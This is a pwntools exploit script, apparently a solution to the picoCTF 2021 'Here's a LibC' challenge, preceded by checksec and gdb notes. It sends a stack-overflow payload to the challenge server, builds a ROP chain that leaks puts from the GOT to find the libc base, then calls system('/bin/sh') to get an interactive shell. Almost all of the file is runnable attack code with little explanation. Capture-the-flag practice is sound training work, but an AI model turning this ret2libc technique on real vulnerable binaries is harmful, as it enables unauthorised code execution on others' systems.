'''

root@kali:/home/kali/Desktop/pico2021/Here_A_LibC# checksec vuln 
[*] '/home/kali/Desktop/pico2021/Here_A_LibC/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./'


pwndbg> x/gx $rbp-8
0x7fffffffe428: 0x0000000000000000

first scanf: 0x7fffffffe3b0
second scanf: 0x7fffffffe3af


'''

from pwn import *


local_bin = "./vuln"
elf = ELF(local_bin)
rop = ROP(elf)
#libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
libc = ELF("./libc.so.6")
p = remote("mercury.picoctf.net",23584)
#p = process(local_bin)
#p = gdb.debug(local_bin, '''
	#break main
	#break do_stuff
	#break *do_stuff+138
	#continue
	#''')

POPRDI_gadget = (rop.find_gadget(['pop rdi','ret']))[0]
print("POP RDI Gadget = ", POPRDI_gadget )

OFFSET_MAIN_PLT = elf.symbols['main']
print(hex(OFFSET_MAIN_PLT))
OFFSET_PUTS_PLT = elf.symbols['puts']
print(hex(OFFSET_PUTS_PLT))
OFFSET_PUTS_GOT = elf.got['puts']
print(hex(OFFSET_PUTS_GOT))

output = p.recvuntil('\n')

offset = 0x7fffffffe448 - 0x7fffffffe3b0 - 8 - 8

payload = b'A' * offset
payload += p64(POPRDI_gadget+1) 
payload += p64(POPRDI_gadget)
#payload += p64(POPRDI_gadget)
payload += p64(OFFSET_PUTS_GOT)
payload += p64(OFFSET_PUTS_PLT)
payload += p64(POPRDI_gadget+1)
payload += p64(OFFSET_MAIN_PLT)




#payload += p64(POPRDI_gadget)
#payload += p64(POPRDI_gadget)

p.sendline(payload)

leak = p.recvuntil(b'\n')
#print("[+] leak = ", leak)
leak = p.recvuntil(b'\n')
print("[+] Puts leak = ", leak)

print("[+] Calculating libc base")
leak = leak[:-1]
print("[+] Leaked = ",leak)
leak_dec = int.from_bytes(leak,"little")
print("[+] leak_dec = ", (leak_dec))
print("[+] Leaked puts = ", hex(leak_dec))

libc_base = leak_dec - libc.sym["puts"]
print("[+] libc_base = ", hex(libc_base))

libc.address = libc_base
BINSH = next(libc.search(b"/bin/sh")) #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

print("[+] Restarting main")

output = p.recvuntil('\n')
payload = b'A' * offset
payload += p64(POPRDI_gadget+1) 
payload += p64(POPRDI_gadget, endian='little')
payload += p64(BINSH)
payload += p64(SYSTEM)
payload += p64(EXIT)

p.sendline(payload)

p.interactive()